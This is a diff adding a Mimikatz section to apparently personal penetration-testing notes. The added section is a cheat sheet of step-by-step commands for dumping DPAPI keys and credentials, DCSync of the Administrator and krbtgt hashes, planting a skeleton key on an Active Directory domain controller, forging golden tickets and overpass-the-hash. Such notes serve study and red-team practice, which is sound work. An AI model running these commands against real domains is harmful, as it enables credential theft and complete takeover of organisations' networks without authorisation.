@@ -137,3 +137,32 @@ There are tools which can be used for that like:
 And there are tools which are used to analyze and extract hidden messages like zsteg.
 
 # Covering tracks
+
+# Mimikatz
+It is a Windows password post exploitation tool used to dump credentials and other sensitive information.
+
+### what is DP API?
+DPAPI stands for Data Protection API, which is a feature provided by Windows systems for encrypting and decrypting data. DPAPI is primarily used to protect sensitive data stored on Windows systems, such as user credentials, private keys, and other secrets.
+
+- `sekurlsa::dpapi` to grap master keys from dpapi.
+- `lsadump::backupkeys /system:win2019.example.com /export`
+- `lsadump::dcsync /domain:example.com /user:Administrator`
+
+### Skeleton Key Attack
+In a skeleton key attack, an attacker gains unauthorized access to a Windows Active Directory (AD) domain controller and injects a "skeleton key" into the domain controller's memory. This "skeleton key" allows the attacker to authenticate as any user on the domain without needing their password (we use "mimikatz" as the passsword).
+
+#### How?
+- Firstly we have to enable the SeDebugPrivilege privilege for the current process: `privilege::debug`
+- then: `misc::skeleton` and that's it!
+
+### Golden Ticket Attack
+A golden ticket allows to authenticate to any service with one single ticket. 
+
+1. First we need to find the krbtgt service hash: `lsadump::dcsync /domain:example.com /user:krbtgt`.
+2. Then we need to find the SID of a user account that will be granted the ticket: `whoami /user` on user's machine (Either an account I created or one I compromised).
+3. Then: `kerberos::golden /domain:example.com /sid:{sid} /rc4:{krbtgt NTLM hash} /id:500 /user:{anything}` will grant the user this ticket where we use 500 as we are looking for administrative privileges.
+
+### Overpass the Hash Attack
+1. Firstly we need to find the user NTLM hash: `sekurlsa::logonpasswords`.
+2. Then we need to execute this command: `sekurlsa::pth /user:Admisitrator /domain:example.com /ntlm:{user's NTLm}`.
+3. Mimikatz opens a prompt then with user's privileges.
